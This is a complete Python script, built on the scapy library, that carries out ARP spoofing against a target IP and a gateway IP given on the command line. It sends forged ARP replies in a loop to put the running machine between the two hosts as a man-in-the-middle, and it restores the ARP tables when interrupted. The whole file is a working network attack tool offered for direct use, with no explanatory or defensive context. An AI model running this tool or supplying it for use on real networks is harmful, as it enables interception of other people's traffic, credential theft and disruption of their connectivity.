#! /usr/bin/env python3

import scapy.all as scapy
import time
import argparse

def get_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
	arp_request_broadcast = broadcast/arp_request
	answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

	return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip ):
	target_mac = get_mac(target_ip) 
	packet = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=spoof_ip)
	scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
	destination_mac = get_mac(destination_ip)
	source_mac = get_mac(source_ip)
	packet = scapy.ARP(op=2, hwdst=destination_mac, pdst=destination_ip, psrc=source_ip, hwsrc=source_mac)
	scapy.send(packet, count=4, verbose=False)



if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument('-t', '--target', help='Target IP')
	parser.add_argument('-s', '--spoof', help='Gateway IP')
	args = parser.parse_args()
	sent_packets = 0
	if args.target and args.spoof:
		while True:
			try:
				spoof(args.target, args.spoof)
				spoof(args.spoof, args.target)
				sent_packets += 2
				print(f'\r[+] Sent {sent_packets} packets', end="")
				time.sleep(2)
			except KeyboardInterrupt:
				print('\n[+] Detected CTRL + C. Restroing ARP tables...')
				restore(args.target, args.spoof)
				restore(args.spoof, args.target)
				break
	else: 
		print('[+] See -h for usage.')


